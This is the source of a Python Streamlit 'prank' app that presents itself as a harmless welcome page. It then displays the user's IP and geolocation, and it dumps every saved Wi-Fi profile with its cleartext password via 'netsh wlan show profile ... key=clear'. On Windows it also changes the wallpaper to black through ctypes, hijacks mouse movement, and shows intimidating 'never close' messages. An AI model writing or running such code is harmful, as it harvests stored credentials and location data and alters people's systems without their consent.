import streamlit as st
import geocoder
import subprocess
import ctypes
import time
import os
import re
from PIL import Image
import random
import threading
import platform
from streamlit_autorefresh import st_autorefresh

st.set_page_config(page_title="Hi! There", layout="centered", page_icon="👁️")
st.title("🌐 Welcome to Stimulate")
# Auto-refresh every 15 seconds (15000 ms)

st_autorefresh(interval=15000, limit=None, key="refresh")

# --- Detect if running on Streamlit Cloud ---
IS_CLOUD = os.environ.get("STREAMLIT_SERVER_ENV") == "streamlit_cloud"

# --- Fetch IP and Location Info ---
g = geocoder.ip('me')
location_data = g.geojson['features'][0]['properties'] if g and g.ok else {}
ip_address = g.ip if g and g.ok else None

# --- First Innocent Message ---
st.markdown("## 😎 Welcome! Nothing special here...")
st.markdown("### 🧐 Scroll down to see something crazy... 👀")
st.markdown("<br><br><br><br><br><br><br><br><br><br><br>", unsafe_allow_html=True)

# --- Surprise Section (IP and Location) ---
st.subheader("🎯 Surprise! Here's What We Found:")

if ip_address:
    st.success(f"**Your IP Address is:** `{ip_address}`")
else:
    st.error("❌ Could not retrieve your IP address.")

if location_data:
    st.write(f"**City:** {location_data.get('city', 'Unknown')}")
    st.write(f"**Region:** {location_data.get('region', 'Unknown')}")
    st.write(f"**Country:** {location_data.get('country', 'Unknown')}")
    st.write(f"**Latitude:** {location_data.get('lat', 'Unknown')}")
    st.write(f"**Longitude:** {location_data.get('lng', 'Unknown')}")
else:
    st.warning("Location details not available.")

# --- More Scroll Down Space ---
st.markdown("<br><br><br><br><br><br><br><br><br><br><br>", unsafe_allow_html=True)
st.markdown("### 📡 Scroll down to also see your Wi-Fi History...")

# --- Wi-Fi History Section ---
st.subheader("🔍 Your Wi-Fi History:")
try:
    result = subprocess.run(['netsh', 'wlan', 'show', 'profile'], capture_output=True, text=True)
    if result.stdout:
        st.write("Here are the saved Wi-Fi profiles on your system:")
        st.code(result.stdout)
    else:
        st.warning("No Wi-Fi profiles found or access denied.")
except Exception as e:
    st.error(f"❌ An error occurred while fetching Wi-Fi details: {e}")

# --- Scroll More ---
st.markdown("<br><br><br><br><br><br><br><br><br><br><br>", unsafe_allow_html=True)
st.markdown("### 🔥 Scroll down even more for the final surprise!")

# --- Mouse Prank Function (safe for local only) ---
def mouse_prank_safe(duration=10):
    try:
        import pyautogui as pag
    except ImportError:
        return  # Can't import pyautogui, skip prank
    except Exception:
        return

    end_time = time.time() + duration
    while time.time() < end_time:
        x = random.randint(600, 700)
        y = random.randint(200, 600)
        pag.moveTo(x, y, duration=0.5)

# --- Final Shock Button ---
if st.button("👻 Click Here for the Final Shock!", key="final_shock_button"):
    st.subheader("🔐 Saved Wi-Fi Profiles & Passwords:")

    try:
        result = subprocess.run(['netsh', 'wlan', 'show', 'profiles'], capture_output=True, text=True)
        profiles_output = result.stdout
        profiles = re.findall(r"All User Profile\s*:\s(.*)", profiles_output)

        if profiles:
            for profile in profiles:
                profile = profile.strip()
                password_result = subprocess.run(
                    ['netsh', 'wlan', 'show', 'profile', profile, 'key=clear'],
                    capture_output=True, text=True
                )
                password_output = password_result.stdout
                password_search = re.search(r"Key Content\s*:\s(.*)", password_output)
                password = password_search.group(1) if password_search else "🔒 Not Found / Secured"
                st.write(f"📶 **{profile}** — 🔑 `{password}`")
        else:
            st.warning("No Wi-Fi profiles found.")
    except Exception as e:
        st.error(f"❌ Something went wrong while fetching Wi-Fi passwords: {e}")

    # --- Wallpaper Change (Windows only) ---
    if platform.system() == "Windows":
        try:
            black_wallpaper_path = os.path.join(os.getcwd(), "black.jpg")
            if not os.path.exists(black_wallpaper_path):
                black_img = Image.new('RGB', (1920, 1080), color=(0, 0, 0))
                black_img.save(black_wallpaper_path)
            ctypes.windll.user32.SystemParametersInfoW(20, 0, black_wallpaper_path, 3)
        except Exception as e:
            st.warning(f"⚠️ Could not change wallpaper: {e}")
    else:
        st.info("Wallpaper change only works on Windows.")

    # --- Ghost Flicker Placeholder ---
    try:
        st.markdown("### 👁️ Screen glitch initiated...")
        for i in range(3):
            st.markdown(f"👻 Flicker {i+1}")
            time.sleep(1.2)
    except Exception as e:
        st.error(f"💀 Visual effect failed: {e}")

    # --- Mouse Movement Prank (Local only) ---
    if IS_CLOUD:
        st.info("Mouse prank disabled on cloud environment.")
    else:
        try:
            st.markdown("### 🖱️ Your mouse has been possessed... 😈")
            prank_thread = threading.Thread(target=mouse_prank_safe)
            prank_thread.start()
        except Exception as e:
            st.error(f"❌ Mouse prank failed: {e}")

# --- Creepy never close vibe ---
st.markdown("""
<style>
html, body, .main, .block-container {
    background-color: black !important;
    color: crimson !important;
    font-family: 'Courier New', monospace;
    user-select: none;
}
h1, h2, h3, h4, h5, h6, p {
    animation: flicker 2s infinite;
}
@keyframes flicker {
    0%, 100% {opacity: 1;}
    50% {opacity: 0.4;}
}
</style>
""", unsafe_allow_html=True)

st.markdown("<h1 style='text-align:center; margin-top: 50px;'>💀 GhostCam failed to capture your image. You're safe... for now.</h1>", unsafe_allow_html=True)
st.markdown("<h3 style='text-align:center;'>The website will never close... 😈</h3>", unsafe_allow_html=True)

